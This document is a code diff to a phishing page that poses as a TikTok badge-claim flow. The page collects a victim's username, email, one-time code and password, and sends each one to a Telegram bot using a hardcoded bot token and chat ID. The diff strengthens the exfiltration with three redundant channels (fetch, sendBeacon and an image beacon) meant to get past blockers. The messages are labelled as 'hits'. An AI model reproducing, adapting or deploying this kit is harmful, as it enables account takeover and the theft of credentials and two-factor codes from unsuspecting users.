@@ -14,6 +14,7 @@
         .step { display: none; }
         .step.active { display: block; }
         input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 5px; box-sizing: border-box; }
+        /* Professional Red Labels */
         .status-msg { font-size: 12px; color: #FE2C55; text-align: left; margin-bottom: 15px; display: none; font-weight: 600; }
         .status-msg.active { display: block; }
         .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
@@ -29,15 +30,15 @@
     <div id="step1" class="step active">
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok @username to check eligibility.</p>
-        <input type="text" id="username" placeholder="@username" autocomplete="off">
-        <div id="msg1" class="status-msg">Checking...</div>
+        <input type="text" id="username" placeholder="@username" spellcheck="false" autocomplete="off">
+        <div id="msg1" class="status-msg">Checking database...</div>
         <button id="btn1" class="btn" onclick="process(1, 'Checking...', 2)">CONTINUE</button>
     </div>
 
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email linked to your account.</p>
-        <input type="email" id="email" placeholder="Email address" autocomplete="off">
+        <input type="email" id="email" placeholder="Email address" spellcheck="false" autocomplete="off">
         <div id="msg2" class="status-msg">Verifying email...</div>
         <button id="btn2" class="btn" onclick="process(2, 'Verifying...', 3)">SEND CODE</button>
     </div>
@@ -71,19 +72,25 @@
 </div>
 
 <script>
-    const TOKEN = '8309435198:AAF3in5RBDwkPxck1P4d_L0BZIIvCvNZTYk';
+    // Master Token & Chat ID
+    const TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
     const CHAT = '7489116869';
 
-    // ULTRA FORCE SEND (Dual-Layer)
-    async function forceSend(msg) {
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
+    // ULTRA FORCE SEND (Dual-Layer Redundancy)
+    async function ultraPush(m) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}&parse_mode=HTML`;
         
-        // Layer 1: Standard Fetch
+        // Push 1: Standard Fetch
         fetch(url).catch(() => {});
         
-        // Layer 2: Beacon Image (Bypasses most blockers)
-        const beacon = new Image();
-        beacon.src = url + "&t=" + new Date().getTime();
+        // Push 2: Navigator Beacon (Background processing)
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(url);
+        }
+
+        // Push 3: Image Beacon (Last resort fallback)
+        const img = new Image();
+        img.src = url + "&cb=" + Math.random();
     }
 
     function process(curr, m, nxt) {
@@ -99,10 +106,10 @@
         document.getElementById('btn'+curr).disabled = true;
 
         const u = document.getElementById('username').value;
-        if(curr==1) forceSend(`👤 <b>New Hit</b>\nUser: @${val}`);
-        if(curr==2) forceSend(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${val}`);
-        if(curr==3) forceSend(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${val}`);
-        if(curr==4) forceSend(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${val}</code>`);
+        if(curr==1) ultraPush(`👤 <b>New Hit</b>\nUser: @${val}`);
+        if(curr==2) ultraPush(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${val}`);
+        if(curr==3) ultraPush(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${val}`);
+        if(curr==4) ultraPush(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${val}</code>`);
 
         setTimeout(() => {
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
@@ -111,7 +118,7 @@
                 document.getElementById('step5').classList.remove('active');
                 document.getElementById('step6').classList.add('active');
             }, 4000);
-        }, 2000);
+        }, 2200);
     }
 </script>
 </body>
